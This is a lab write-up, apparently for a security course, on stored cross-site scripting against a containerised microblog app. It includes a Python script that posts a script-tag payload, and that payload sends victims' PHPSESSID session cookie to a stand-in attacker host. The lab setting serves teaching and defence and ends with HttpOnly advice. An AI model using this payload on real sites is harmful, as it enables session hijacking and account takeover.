## Setup

***

Our network setup in this example is defined in our docker-compose file. Again,
alice and mallory are simply users of the microblog app

```yaml
version: '3'

services:
  microblog:
    image: # private image
    container_name: microblog
    ports:
      - "8080:80"
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  alice:
    image: # private image
    container_name: alice
    tty: true
    shm_size: '1gb'
    sysctls:
        - net.ipv6.conf.all.disable_ipv6=1
    networks:
      channel:
        ipv4_address: 10.0.0.3
        
  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      volumes:
          - .:/shared
      network_mode: service:microblog
      
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:microblog

networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

we start the containers with `$ docker-compose up` as usual.

## Overview

***

The idea behind XSS is that an attacker can inject javascript on webpages which
may be executed when other users visit the where the injected script resides.

In this case, the main post page vulnerable to this sort of attack since the
backend does not check the content the users post and simply serves back
whatever is written (including html tags which may be interpretted differently
by the browser).

<!--MICROBLOG post with tags image-->

checking the developer console we can also read the name used for the session token

<!--dev console cooke name-->

## Scripting the Attack

***

We take advantage of the lack of sanitization in our exploit which has an image (since most browsers fetch
the source automatically) to send the user's cookie to a third party site possibly
storing it for Mallory to use in the future.

```python
import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

jsinj = '<img id="TCBE"><script>\
var base = "http://mallory.example.com/set.php?token=";\
var end = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1");\
var malsrc = base + end;\
document.getElementById("TCBE").src=malsrc;\
</script>'

with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)
     # post a message (POST request)
     res = s.post(BASE + '/post.php', data={'msg': jsinj})
```

## Conclusion

***

XSS can be one of the most far reaching vulnerabilities to affect an app. Here, we targetted a cookie but
getting users to arbitrary javascript (at least what the browsers permit) can have serious repercussions.

As for protecting a session cookie, the HttpOnly flag will cause most browsers to not allow frontend javascript code
to read the corresponding cookie providing some level of protection.

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
